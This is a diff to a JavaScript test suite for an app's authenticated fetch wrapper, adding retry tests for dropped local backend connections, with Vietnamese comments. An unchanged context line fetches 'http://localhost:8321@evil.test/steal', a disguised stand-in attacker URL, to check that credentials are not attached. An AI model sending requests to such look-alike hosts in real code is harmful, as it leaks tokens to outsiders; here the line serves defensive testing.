@@ -80,5 +80,34 @@ describe('API request authentication', () => {
     await window.fetch('http://localhost:8321@evil.test/steal');
     expect(invokeMock).not.toHaveBeenCalled();
     expect(transport.mock.calls[1][0]).toBe('http://localhost:8321@evil.test/steal');
+
+    // Backend dev hot-reload đóng socket khoảng một giây: request đọc phải tự hồi phục.
+    const beforeRetry = transport.mock.calls.length;
+    transport
+      .mockRejectedValueOnce(new TypeError('Failed to fetch'))
+      .mockResolvedValueOnce(new Response(null, { status: 200 }));
+    const recovered = await window.fetch('http://localhost:8321/api/vdp/fonts');
+    expect(recovered.status).toBe(200);
+    expect(transport).toHaveBeenCalledTimes(beforeRetry + 2);
+    const beforeReadPost = transport.mock.calls.length;
+    transport
+      .mockRejectedValueOnce(new TypeError('Failed to fetch'))
+      .mockResolvedValueOnce(new Response(null, { status: 200 }));
+    await window.fetch('http://localhost:8321/api/imposition/pdf-text', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{"path":"D:/sample.pdf","page":1}',
+    });
+    expect(transport).toHaveBeenCalledTimes(beforeReadPost + 2);
+
+
+    // POST tạo trạng thái không được lặp, tránh tạo hai job/file khi response bị đứt.
+    const beforeUnsafePost = transport.mock.calls.length;
+    transport.mockRejectedValueOnce(new TypeError('Failed to fetch'));
+    await expect(window.fetch('http://localhost:8321/api/jobs', {
+      method: 'POST',
+      body: '{}',
+    })).rejects.toThrow('Failed to fetch');
+    expect(transport).toHaveBeenCalledTimes(beforeUnsafePost + 1);
   });
 });
